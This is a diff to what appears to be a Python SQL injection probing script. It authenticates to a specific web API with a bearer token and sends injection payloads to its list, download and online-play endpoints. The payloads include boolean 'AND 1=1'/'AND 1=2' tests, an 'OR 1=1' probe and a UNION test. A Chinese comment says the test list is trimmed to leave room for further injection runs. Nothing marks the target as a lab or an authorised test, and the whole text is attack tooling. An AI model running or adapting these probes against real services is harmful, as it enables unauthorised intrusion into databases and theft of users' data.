@@ -49,12 +49,8 @@ if st == 200:
 H = {"Authorization": "Bearer " + tok}
 log("login: %s tok:%s" % (st, tok[:10] or "NONE"))
 
-# 注入测试矩阵
+# 注入测试矩阵 (精简: 6 个核心, 给 sqli2/3 留窗口)
 tests = [
-    ("GET", "/api/lois/6422'", "id-quote", "auth"),
-    ("GET", "/api/lois/6422--", "id-comment", "auth"),
-    ("GET", "/api/lois/6422%20OR%201=1", "id-or", "auth"),
-    ("GET", "/api/lois?page=1'", "page-quote", "auth"),
     ("GET", "/api/lois?page=1%20AND%201=1", "page-and1", "auth"),
     ("GET", "/api/lois?page=1%20AND%201=2", "page-and2", "auth"),
     (
@@ -63,22 +59,9 @@ tests = [
         "page-union",
         "auth",
     ),
-    ("GET", "/api/lois?sort=id", "sort", "auth"),
-    ("GET", "/api/lois?sort=id%20desc", "sort-desc", "auth"),
-    ("GET", "/api/lois?sort=id;--", "sort-semi", "auth"),
-    ("GET", "/api/lois?order=id%20desc", "order", "auth"),
-    ("GET", "/api/user/loi/download_v6/6422'", "dl-quote", "auth"),
     ("GET", "/api/user/loi/download_v6/6422%20OR%201=1", "dl-or", "auth"),
-    ("GET", "/api/user/loi/download_v6/6422--", "dl-comment", "auth"),
-    ("GET", "/api/user/loi/online_play_v2/6422'", "op-quote", "auth"),
-    ("GET", "/api/user/loi/online_play_v2/6422%20OR%201=1", "op-or", "auth"),
-    ("GET", "/api/lois?q=test", "search-q", "auth"),
-    ("GET", "/api/lois?page=1&type=1", "type", "auth"),
-    ("GET", "/api/lois/6422", "id-normal", "auth"),
+    ("GET", "/api/lois?sort=id%20desc", "sort-desc", "auth"),
     ("GET", "/api/lois?page=1", "page-normal", "auth"),
-    ("GET", "/api/lois/6422'", "id-quote-anon", "anon"),
-    ("GET", "/api/lois?page=1%20AND%201=2", "page-and2-anon", "anon"),
-    ("GET", "/api/lois?sort=id", "sort-anon", "anon"),
 ]
 
 res = []
